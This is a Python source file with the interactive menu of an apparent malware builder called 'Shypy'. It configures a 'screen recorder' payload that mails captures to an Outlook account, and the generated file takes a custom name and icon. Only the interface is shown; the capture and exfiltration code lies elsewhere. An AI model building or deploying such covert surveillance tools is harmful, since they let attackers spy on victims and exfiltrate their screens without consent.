import importlib
from ..utils.module_utils import *
from ..variables.variables import *

class ScreenRecorderGenerator(ModuleUtils):
    """
    The Generator class is responsible for managing the screen recorder generation process.
    It provides a command-line interface for setting up the necessary parameters and
    generating the screen recorder.
    """
    def __init__(self) -> None:
        """
        Constructor method for the Generator class.
        Initializes the payload, mail, password, and timeout attributes.
        """
        super().__init__()
        self.module   : str = "screen_recorder"
        self.payload  : str = ""
        self.mail     : str = ""
        self.password : str = ""
        self.time_out : str = ""
        
    def run(self) -> None:
        """
        Runs the main command-line interface for setting up and generating the screen recorder.
        Provides options for setting email, password, timeout, and payload, as well as
        displaying available payloads and generating the screen recorder.
        """
        self.clear()
        
        print(f"""{COLOR['CYAN']}
            ╔══════════════════════════════════════════════════════════════════════════╗
            ║*                      - Screen Recorder Generator -                     *║
            ╠══════════════════════════════════════════════════════════════════════════╣
            ║ IMPORTANT : Outlook.com Should Be Used As The E-mail Address.            ║
            ╠═════════════════════════════════════╦════════════════════════════════════╣ 
            ║              Commands               ║            Function                ║    
            ╠═════════════════════════════════════╬════════════════════════════════════╣   
            ║ "set mail <email>"                  : Set Mail Adress.                   ║ 
            ║ "set password <password>"           : Set Mail Password.                 ║
            ║ "set timeout <time>"                : Set Time Out.                      ║ 
            ║ "set payload" <payload name>        : Set Payload.                       ║ 
            ║ "show payloads"                     : Showing all Payloads.              ║ 
            ║ "generate"                          : Generate a Screen Recorder.        ║
            ║ "back"                              : Back To Shypy.                     ║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*             E-Mail                 : {COLOR['RESET']}{self.mail}{COLOR['CYAN']}{' ' *  (35 - len(self.mail))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*            Password                : {COLOR['RESET']}{self.password}{COLOR['CYAN']}{' ' *  (35 - len(self.password))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*            Time Out                : {COLOR['RESET']}{str(self.time_out)}{COLOR['CYAN']}{' ' *  (35 - len(str(self.time_out)))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*             Payload                : {COLOR['RESET']}{self.payload}{COLOR['CYAN']}{' ' * (35 - len(self.payload))}║                                             
            ╠═════════════════════════════════════╩════════════════════════════════════╣            
            ║*                               - The Shypy -                            *║ 
            ╚══════════════════════════════════════════════════════════════════════════╝
            \n\n""")

        answer = input(f"{COLOR['CYAN']}{FLAG}{COLOR['RESET']}").lower().strip()

        if answer.startswith("set mail"):
            try:
                self.mail = answer.split(" ")[2]
                self.run() 
            
            except IndexError:
                self.write(message="set mail <mail>", level=4, delay=1, clear=False)
                self.run()

        elif answer.startswith("set password"):
            try:
                self.password = answer.split(" ")[2]
                self.run()
            
            except IndexError:
                self.write(message="set password <password>", level=4, delay=1, clear=False)
                self.run()

        elif answer.startswith("set timeout"):
            try:
                self.time_out = int(answer.split(" ")[2])
                self.run()
                    
            except IndexError:
                self.write(message="set timeout <delay>", level=4, delay=1, clear=False)
                self.run()
                
            except ValueError:
                self.write(message="Please enter integer type.", level=4, delay=1, clear=False)
                self.run()
        
        elif answer.startswith("set payload"):
            try:
                self.payload = answer.split(" ")[2]
                self.run()
            
            except IndexError:
                self.write(message="set payload <payload name>", level=4, delay=1, clear=False)
                self.run()
        
        elif answer == "show payloads":
            self.list_payloads(self.module)

        elif answer == "generate":
            if self.mail == "" or self.password == "" or self.time_out == "" or self.payload == "":
                self.write(message="Please fill in the required fields.", level=4, delay=1, clear=False)
                self.run()
            
            else:
                screen_recorder_name = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Name Of Screen Recorder: ") + ".py"
                screen_recorder_icon = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Icon Of Screen Recorder (Optional): ")
                
                self.pipeline(
                    module=self.module, payload=self.payload, mail=self.mail, password=self.password, 
                    timeout=int(self.time_out), name=screen_recorder_name, icon_path=screen_recorder_icon)
                
                sys.exit(1)
            
        elif answer == "back":
            importlib.import_module("main").Shypy().menu()

        else:
            self.write(message="Invalid Option.", level=4, delay=1, clear=False)
            self.run()